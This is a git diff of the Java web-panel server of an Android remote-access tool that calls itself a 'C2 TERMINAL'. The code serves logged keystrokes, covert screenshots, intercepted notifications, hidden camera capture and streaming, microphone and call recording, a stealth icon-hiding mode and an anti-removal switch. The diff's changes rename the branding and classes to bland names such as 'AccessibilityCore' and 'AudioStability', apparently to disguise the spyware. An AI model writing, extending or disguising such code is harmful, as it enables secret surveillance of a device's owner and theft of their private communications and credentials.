@@ -114,7 +114,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<head>" +
             "<meta charset=\"UTF-8\">" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
-            "<title>Lab-RATS | C2 TERMINAL</title>" +
+            "<title>UPLINK | TERMINAL</title>" +
             "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
             "<style>" +
             "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
@@ -372,7 +372,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .btn-container { flex-direction: column !important; gap: 8px !important; }" +
             "  .flex-header { flex-direction: column !important; align-items: flex-start !important; gap: 10px !important; }" +
             "  .btn-back { width: 100%; justify-content: center; padding: 10px; font-size: 0.7rem; border-radius: 12px; }" +
-            "  .watermark { opacity: 1.0 !important; height: 72px !important; top: 25px !important; left: -1px !important; transform: none !important; z-index: 0; }" +
+            "  .watermark { position: relative !important; top: 0 !important; left: 0 !important; transform: none !important; margin-bottom: 15px; height: 85px !important; width: auto !important; opacity: 1.0 !important; z-index: 10; pointer-events: none; display: block !important; }" +
             "  .intel-status { font-size: 0.65rem !important; white-space: nowrap !important; line-height: 1.2; }" +
             "  table { display: block; overflow-x: auto; width: 100%; -webkit-overflow-scrolling: touch; }" +
             "  th, td { padding: 10px 8px; font-size: 0.65rem; }" +
@@ -464,8 +464,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<body>" +
             "<div class=\"container\">" +
             "  <div class=\"header\">" +
-            "    <img src=\"/logo?v=145\" class=\"watermark\" alt=\"LAB-RATS\" loading=\"eager\">" +
-            "    <div class=\"title-font\">LAB-RATS</div>" +
+            "    <img src=\"/logo?v=145\" class=\"watermark\" alt=\"UPLINK\" loading=\"eager\">" +
+            "    <div class=\"title-font\">CORE_UPLINK</div>" +
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
             "    </div>" +
@@ -519,7 +519,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "</body>" +
             "</html>";
 
-    private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>Lab-RATS | LOGIN</title>" +
+    private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>UPLINK | LOGIN</title>" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
             "<style>" +
             "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
@@ -586,7 +586,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "}" +
             "</script></body></html>";
 
-    private static final String LOGOUT_HTML = "<!DOCTYPE html><html><head><title>Lab-RATS | LOGOUT</title>" +
+    private static final String LOGOUT_HTML = "<!DOCTYPE html><html><head><title>UPLINK | LOGOUT</title>" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
             "<style>" +
             "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
@@ -748,7 +748,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     } else if (uri.equals("/terminal/restart")) {
                         logActivity("SECURITY_MAINTENANCE: Initiating remote service restart...");
                         new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                            Intent intent = new Intent(context, HttpServerService.class);
+                            Intent intent = new Intent(context, CoreSyncService.class);
                             intent.setAction("START");
                             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                 context.startForegroundService(intent);
@@ -779,7 +779,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     } else if (uri.equals("/intel")) {
                         response = serveIntel(params);
                     } else if (uri.equals("/intel/clear")) {
-                        NotificationSniffer.clearHistory(context);
+                        StatusNotification.clearHistory(context);
                         logActivity("SYSTEM_MAINTENANCE: Intel history purged");
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.startsWith("/files/edit/")) {
@@ -815,14 +815,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     } else if (uri.equals("/ghost/keys")) {
                         response = serveKeystrokes();
                     } else if (uri.equals("/ghost/clear")) {
-                        GhostService.clearKeystrokes();
+                        AccessibilityCore.clearKeystrokes();
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/ghost/screenshot")) {
                         response = serveCovertScreenshot();
                     } else if (uri.equals("/ghost/status")) {
-                        boolean active = GhostService.getInstance() != null;
-                        boolean antiRemoval = GhostService.isAntiRemovalEnabled();
-                        boolean blackout = GhostService.isBlackoutActive();
+                        boolean active = AccessibilityCore.getInstance() != null;
+                        boolean antiRemoval = AccessibilityCore.isAntiRemovalEnabled();
+                        boolean blackout = AccessibilityCore.isBlackoutActive();
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"active\": " + active + ", \"antiRemoval\": " + antiRemoval + ", \"blackout\": " + blackout + "}");
                     } else if (uri.equals("/ghost/interact")) {
                         response = performInteraction(params);
@@ -893,7 +893,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         // Status Monitor Card
         html.append("<div class=\"card\">");
         html.append("<div style=\"margin-bottom: 25px;\">");
-        String snifferStatus = NotificationSniffer.isServiceRunning() ? 
+        String snifferStatus = StatusNotification.isServiceRunning() ? 
             "<span style=\"color:var(--neon-green); font-size:0.65rem; vertical-align:middle;\">INTEL_ACTIVE</span>" : 
             "<span style=\"color:var(--danger); font-size:0.65rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
         html.append("<h2 style=\"margin:0; letter-spacing:1px; line-height:1.2;\">SYSTEM_MONITOR ").append(snifferStatus).append("</h2>");
@@ -1027,7 +1027,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
         // Breadcrumb Trail
         html.append("<div class=\"breadcrumb\" style=\"margin-top: 30px;\">");
-        html.append("<span style=\"color: var(--neon-green); margin-right: 10px;\">root@Lab-RATS:~$</span>");
+        html.append("<span style=\"color: var(--neon-green); margin-right: 10px;\">root@UPLINK:~$</span>");
         html.append("<a href=\"/files\">storage</a>");
 
         if (!path.isEmpty()) {
@@ -1850,7 +1850,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     // ============ Camera Methods ============
 
     private Response serveCameraPage() {
-        boolean nightMode = CameraService.isNightModeEnabled(context);
+        boolean nightMode = MediaContainer.isNightModeEnabled(context);
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"back-btn-container\">");
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
@@ -1999,28 +1999,28 @@ public class LabRatsHttpServer extends NanoHTTPD {
             byte[] imageData = null;
             String error = null;
 
-            if (CameraService.isCurrentlyStreaming()) {
+            if (MediaContainer.isCurrentlyStreaming()) {
                 // If streaming, grab latest frame for instant snapshot
-                imageData = CameraService.getNextFrame(1000);
+                imageData = MediaContainer.getNextFrame(1000);
                 if (imageData == null) error = "Timeout waiting for frame from stream";
             } else {
-                // Use CameraService's background capture protocol
-                CameraService service = CameraService.getInstance();
+                // Use MediaContainer's background capture protocol
+                MediaContainer service = MediaContainer.getInstance();
                 if (service == null) {
-                    Intent intent = new Intent(context, CameraService.class);
+                    Intent intent = new Intent(context, MediaContainer.class);
                     context.startForegroundService(intent);
                     // Wait for service initialization
                     for (int i = 0; i < 10; i++) {
                         Thread.sleep(200);
-                        service = CameraService.getInstance();
+                        service = MediaContainer.getInstance();
                         if (service != null) break;
                     }
                 }
 
                 if (service != null) {
                     service.capturePhotoBackground(cameraId);
-                    imageData = CameraService.waitForPhoto(12000);
-                    error = CameraService.getLastCaptureError();
+                    imageData = MediaContainer.waitForPhoto(12000);
+                    error = MediaContainer.getLastCaptureError();
                 } else {
                     // Critical fallback to Helper
                     CameraHelper cameraHelper = new CameraHelper(context);
@@ -2087,14 +2087,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
             byte[] imageData = null;
             String errorMsg = null;
 
-            if (CameraService.isCurrentlyStreaming()) {
-                imageData = CameraService.getNextFrame(1500);
+            if (MediaContainer.isCurrentlyStreaming()) {
+                imageData = MediaContainer.getNextFrame(1500);
             } else {
-                CameraService service = CameraService.getInstance();
+                MediaContainer service = MediaContainer.getInstance();
                 if (service != null) {
                     service.capturePhotoBackground(cameraId);
-                    imageData = CameraService.waitForPhoto(12000);
-                    errorMsg = CameraService.getLastCaptureError();
+                    imageData = MediaContainer.waitForPhoto(12000);
+                    errorMsg = MediaContainer.getLastCaptureError();
                 } else {
                     CameraHelper cameraHelper = new CameraHelper(context);
                     imageData = cameraHelper.capturePhoto(cameraId);
@@ -2460,7 +2460,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response serveMJPEGStream(Map<String, String> params) {
         // Start stream if not already - use low resolution by default for mobile data
-        if (!CameraService.isCurrentlyStreaming()) {
+        if (!MediaContainer.isCurrentlyStreaming()) {
             String camId = params.get("cam");
             // Default to 320x240 with low quality for mobile data compatibility
             startCameraStreamInternal(camId != null ? camId : "0", 320, 240, 30);
@@ -2476,7 +2476,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveSingleFrame() {
-        byte[] frame = CameraService.getNextFrame(200);
+        byte[] frame = MediaContainer.getNextFrame(200);
         if (frame != null && frame.length > 0) {
             java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
             Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
@@ -2537,7 +2537,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private void startCameraStreamInternal(String camId, int width, int height, int quality) {
-        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
+        android.content.Intent intent = new android.content.Intent(context, MediaContainer.class);
         intent.setAction("START_STREAM");
         intent.putExtra("cameraId", camId);
         intent.putExtra("width", width);
@@ -2548,7 +2548,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response stopCameraStream() {
-        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
+        android.content.Intent intent = new android.content.Intent(context, MediaContainer.class);
         intent.setAction("STOP_STREAM");
         context.startService(intent);
 
@@ -2571,7 +2571,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         } catch (Exception e) {
         }
 
-        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
+        android.content.Intent intent = new android.content.Intent(context, MediaContainer.class);
         intent.setAction("START_RECORDING");
         intent.putExtra("cameraId", camId != null ? camId : "0");
         intent.putExtra("width", width);
@@ -2590,22 +2590,22 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response stopVideoRecording() {
         logActivity("OPTICS_TERMINATED: Background recording saved");
-        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
+        android.content.Intent intent = new android.content.Intent(context, MediaContainer.class);
         intent.setAction("STOP_RECORDING");
         context.startService(intent);
 
-        String videoPath = CameraService.getCurrentVideoPath();
+        String videoPath = MediaContainer.getCurrentVideoPath();
         String json = "{\"success\": true, \"message\": \"Recording stopped\"" +
                 (videoPath != null ? ", \"path\": \"" + videoPath + "\"" : "") + "}";
         return newFixedLengthResponse(Response.Status.OK, "application/json", json);
     }
 
     private Response serveCameraStatus() {
-        boolean streaming = CameraService.isCurrentlyStreaming();
-        boolean recording = CameraService.isCurrentlyRecording();
-        String currentCamera = CameraService.getCurrentCameraId();
-        long duration = CameraService.getRecordingDuration();
-        String videoPath = CameraService.getCurrentVideoPath();
+        boolean streaming = MediaContainer.isCurrentlyStreaming();
+        boolean recording = MediaContainer.isCurrentlyRecording();
+        String currentCamera = MediaContainer.getCurrentCameraId();
+        long duration = MediaContainer.getRecordingDuration();
+        String videoPath = MediaContainer.getCurrentVideoPath();
 
         String json = String.format(
                 "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s}",
@@ -2617,14 +2617,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
     // ============ AUDIO/MICROPHONE RECORDING ============
 
     private Response serveAudioPage() {
-        boolean isRecording = CallRecordService.isRecording();
-        boolean isRecordingCall = CallRecordService.isRecordingCall();
-        boolean callInProgress = CallRecordService.isCallInProgress();
-        String callNumber = CallRecordService.getCurrentCallNumber();
-        String callType = CallRecordService.getCurrentCallType();
-        long duration = CallRecordService.getRecordingDuration();
-        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
-        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();
+        boolean isRecording = AudioStability.isRecording();
+        boolean isRecordingCall = AudioStability.isRecordingCall();
+        boolean callInProgress = AudioStability.isCallInProgress();
+        String callNumber = AudioStability.getCurrentCallNumber();
+        String callType = AudioStability.getCurrentCallType();
+        long duration = AudioStability.getRecordingDuration();
+        boolean autoRecordEnabled = AudioStability.isAutoRecordEnabled();
+        boolean saveOnDeviceEnabled = AudioStability.isSaveOnDeviceEnabled();
 
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<style>")
@@ -2749,7 +2749,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             }
         }
 
-        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
+        android.content.Intent intent = new android.content.Intent(context, AudioStability.class);
         intent.setAction("START_MIC_RECORDING");
         intent.putExtra("duration", duration);
 
@@ -2769,7 +2769,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response stopMicRecording() {
         logActivity("ACOUSTICS_TERMINATED: Audio capture ended");
-        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
+        android.content.Intent intent = new android.content.Intent(context, AudioStability.class);
         intent.setAction("STOP_MIC_RECORDING");
         context.startService(intent);
 
@@ -2785,7 +2785,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         String phoneNumber = params.get("number");
         String callType = params.get("type");
 
-        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
+        android.content.Intent intent = new android.content.Intent(context, AudioStability.class);
         intent.setAction("START_CALL_RECORDING");
         intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
         intent.putExtra("call_type", callType != null ? callType : "manual");
@@ -2802,7 +2802,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response stopCallRecording() {
         logActivity("ACOUSTICS_TERMINATED: Call recording ended");
-        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
+        android.content.Intent intent = new android.content.Intent(context, AudioStability.class);
         intent.setAction("STOP_CALL_RECORDING");
         context.startService(intent);
 
@@ -2814,16 +2814,16 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveAudioStatus() {
-        boolean isRecording = CallRecordService.isRecording();
-        boolean isRecordingCall = CallRecordService.isRecordingCall();
-        boolean isRecordingMic = CallRecordService.isRecordingMic();
-        boolean callInProgress = CallRecordService.isCallInProgress();
-        String callNumber = CallRecordService.getCurrentCallNumber();
-        String callType = CallRecordService.getCurrentCallType();
-        long duration = CallRecordService.getRecordingDuration();
-        String recordingPath = CallRecordService.getCurrentRecordingPath();
-        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
-        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();
+        boolean isRecording = AudioStability.isRecording();
+        boolean isRecordingCall = AudioStability.isRecordingCall();
+        boolean isRecordingMic = AudioStability.isRecordingMic();
+        boolean callInProgress = AudioStability.isCallInProgress();
+        String callNumber = AudioStability.getCurrentCallNumber();
+        String callType = AudioStability.getCurrentCallType();
+        long duration = AudioStability.getRecordingDuration();
+        String recordingPath = AudioStability.getCurrentRecordingPath();
+        boolean autoRecordEnabled = AudioStability.isAutoRecordEnabled();
+        boolean saveOnDeviceEnabled = AudioStability.isSaveOnDeviceEnabled();
 
         String json = String.format(
                 "{\"isRecording\": %s, \"isRecordingCall\": %s, \"isRecordingMic\": %s, " +
@@ -2842,7 +2842,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
         boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));
 
-        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
+        android.content.Intent intent = new android.content.Intent(context, AudioStability.class);
         intent.setAction("UPDATE_SETTINGS");
         intent.putExtra("auto_record", autoRecord);
         intent.putExtra("save_on_device", saveOnDevice);
@@ -3412,7 +3412,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         
         html.append("<script>function clearIntel() { if(confirm('Purge all intercepted intel?')) fetch('/intel/clear').then(() => location.reload()); }</script>");
 
-        List<NotificationSniffer.NotificationData> notifications = NotificationSniffer.getHistory();
+        List<StatusNotification.NotificationData> notifications = StatusNotification.getHistory();
 
         if (notifications.isEmpty()) {
             html.append("<div class=\"empty-state\"><div class=\"icon\">&#128225;</div><p>No active intel stream. Waiting for device notifications...</p></div>");
@@ -3439,7 +3439,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 .append("<tbody>");
 
             for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
-                NotificationSniffer.NotificationData n = notifications.get(i);
+                StatusNotification.NotificationData n = notifications.get(i);
                 String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(n.timestamp));
                 
                 // --- SENSITIVE DATA HIGHLIGHTING ---
@@ -3572,7 +3572,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response toggleNightMode() {
-        boolean current = CameraService.isNightModeEnabled(context);
+        boolean current = MediaContainer.isNightModeEnabled(context);
         boolean newValue = !current;
         
         // Save to prefs directly from here
@@ -3581,7 +3581,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         
         logActivity("OPTICS_PROTOCOL: Night Vision " + (newValue ? "ENABLED" : "DISABLED"));
         
-        CameraService service = CameraService.getInstance();
+        MediaContainer service = MediaContainer.getInstance();
         if (service != null) {
             service.setNightMode(newValue);
         }
@@ -3621,7 +3621,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 pm.setComponentEnabledSetting(targetAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 
                 // Trigger notification update
-                Intent refreshIntent = new Intent(context, HttpServerService.class);
+                Intent refreshIntent = new Intent(context, CoreSyncService.class);
                 refreshIntent.setAction("START");
                 context.startService(refreshIntent);
 
@@ -3636,7 +3636,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
 
                 // Trigger notification update
-                Intent refreshIntent = new Intent(context, HttpServerService.class);
+                Intent refreshIntent = new Intent(context, CoreSyncService.class);
                 refreshIntent.setAction("START");
                 context.startService(refreshIntent);
 
@@ -3678,14 +3678,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveCovertScreenshot() {
-        GhostService ghost = GhostService.getInstance();
+        AccessibilityCore ghost = AccessibilityCore.getInstance();
         if (ghost == null) return serveError("Ghost Service Offline");
 
         final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
         final byte[][] result = new byte[1][];
         final String[] error = new String[1];
 
-        ghost.takeCovertScreenshot(new GhostService.ScreenshotCallback() {
+        ghost.takeCovertScreenshot(new AccessibilityCore.ScreenshotCallback() {
             @Override
             public void onSuccess(byte[] jpegData) {
                 result[0] = jpegData;
@@ -3725,7 +3725,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             .append("<span style=\"color:var(--neon-cyan);\">&#128123;</span> GHOST_CONTROLLER")
             .append("</h2>");
 
-        boolean isActive = GhostService.getInstance() != null;
+        boolean isActive = AccessibilityCore.getInstance() != null;
         html.append("<div id=\"ghost-status-card\" class=\"status-card\" style=\"padding:20px; background:rgba(255,255,255,0.05); border-radius:12px; margin-bottom:25px; border:1px solid ").append(isActive ? "var(--neon-green)" : "var(--danger)").append(";\">");
         html.append("<div class=\"info-label\">GHOST_MODE_STATUS</div>");
         html.append("<div id=\"ghost-status-text\" style=\"font-size:1.1rem; font-weight:bold;\">")
@@ -3921,7 +3921,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("  }");
         html.append("}");
         html.append("function restoreNormal() {");
-        html.append("  if(confirm('Restore normal identity? This will re-enable the main Lab-RATS icon.')) {");
+        html.append("  if(confirm('Restore normal identity? This will re-enable the main System icon.')) {");
         html.append("    fetch('/stealth?action=restore').then(r => r.json()).then(d => {");
         html.append("      alert('STEALTH_DISENGAGED: Main icon restored.');");
         html.append("    });");
@@ -3995,7 +3995,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response serveKeystrokes() {
         org.json.JSONArray array = new org.json.JSONArray();
-        for (String key : GhostService.getKeystrokes()) {
+        for (String key : AccessibilityCore.getKeystrokes()) {
             array.put(key);
         }
         try {
@@ -4007,7 +4007,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response performInteraction(Map<String, String> params) {
         String action = params.get("action");
-        GhostService ghost = GhostService.getInstance();
+        AccessibilityCore ghost = AccessibilityCore.getInstance();
         
         if (action == null) return serveError("No action");
 
@@ -4091,7 +4091,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 success = true;
                 break;
             case "toggleAntiRemoval":
-                GhostService.setAntiRemovalEnabled(!GhostService.isAntiRemovalEnabled());
+                AccessibilityCore.setAntiRemovalEnabled(!AccessibilityCore.isAntiRemovalEnabled());
                 success = true;
                 break;
             case "autogrant":
@@ -4109,7 +4109,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     @NonNull
     private Intent getIntent() {
-        android.content.ComponentName componentName = new android.content.ComponentName(context, GhostService.class);
+        android.content.ComponentName componentName = new android.content.ComponentName(context, AccessibilityCore.class);
         String serviceId = componentName.flattenToString();
         
         // Start with the standard accessibility settings intent
